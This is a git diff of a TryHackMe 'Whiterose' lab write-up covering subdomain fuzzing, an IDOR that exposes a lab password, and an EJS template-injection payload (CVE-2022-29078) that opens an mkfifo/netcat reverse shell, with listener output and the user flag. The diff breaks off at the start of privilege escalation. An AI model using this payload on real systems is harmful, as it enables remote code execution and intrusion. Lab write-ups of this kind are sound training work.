@@ -1,8 +1,12 @@
-
+# TryHackMe: Whiterose, EJS exploit and sudoedit bypass(CVE-2022–29078, CVE-2023–22809)
 
 https://tryhackme.com/room/whiterose
 
+# Enumeration
 
+add <machine ip> to /etc/hosts 
+
+```
 ffuf -u http://10.10.116.234/ -H "Host:FUZZ.cyprusbank.thm" -w ~/Downloads/wordlists/subdomains-top1million-5000.txt -fw 1
 
         /'___\  /'___\           /'___\       
@@ -30,19 +34,23 @@ ________________________________________________
 www                     [Status: 200, Size: 252, Words: 19, Lines: 9]
 admin                   [Status: 302, Size: 28, Words: 4, Lines: 1]
 :: Progress: [4989/4989] :: Job [1/1] :: 142 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
+```
 
+fuzzing some possible subdomains. and found interesting subdomain. Next, access to admin.cyprusbank.thm and login with the given credential.
 
+On message page, assume that Gayle Bev is admin, and there is a interesting parameter ?c=5. 
 
+change it to like say ?c=10 and it reveals a secret message.
+
+'''
 http://admin.cyprusbank.thm/messages/?c=10
+'''
 
-Gayle Bev: p~]P@5!6;rs558:q
-
-
-
-
-Using Burp Suite to intercept the request, we modify the password parameter and observe an error message indicating that EJS (Embedded JavaScript) files are being used.
+## Gayle Bev: p~]P@5!6;rs558:q
 
 
+Using Burp Suite to intercept the request, modify the password parameter and observe an error message indicating that EJS files are being used.
+```
 POST /settings HTTP/1.1
 Host: admin.cyprusbank.thm
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
@@ -59,17 +67,22 @@ Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
 name=test&password1=test
-
+```
+```
 ReferenceError: /home/web/app/views/settings.ejs:14
+```
 
+https://security.snyk.io/vuln/SNYK-JS-EJS-2803307
 
-ssti
+ejs is a popular JavaScript templating engine.
 
-name=test&password1=test&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%20
+Affected versions of this package are vulnerable to Remote Code Execution (RCE) by passing an unrestricted render option via the view options parameter of renderFile, which makes it possible to inject code into outputFunctionName. we can possibly manibpulate SSTI vulernability. So what we should do next? we are going to create reverse shell on https://www.revshells.com/ and encoding it using URL encoding. put tun0(openvpn) ip addr and put random port and there we go.
+```
+Payload: name=test&password1=test&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%20
 2%3E%261%7Cnc%2010.17.19.196%205555%20%3E%2Ftmp%2Ff');s
-
-
-
+```
+On our terminal, we start the netcat listener: 
+```
 nc -lnvp 5555
 Listening on 0.0.0.0 5555
 Connection received on 10.10.116.234 58146
@@ -93,6 +106,9 @@ app
 user.txt
 $ cat user.txt
 THM{4lways_upd4te_uR_d3p3nd3nc!3s}
+```
+
+# PE
 
 $ sudo -l
 Matching Defaults entries for web on cyprusbank:
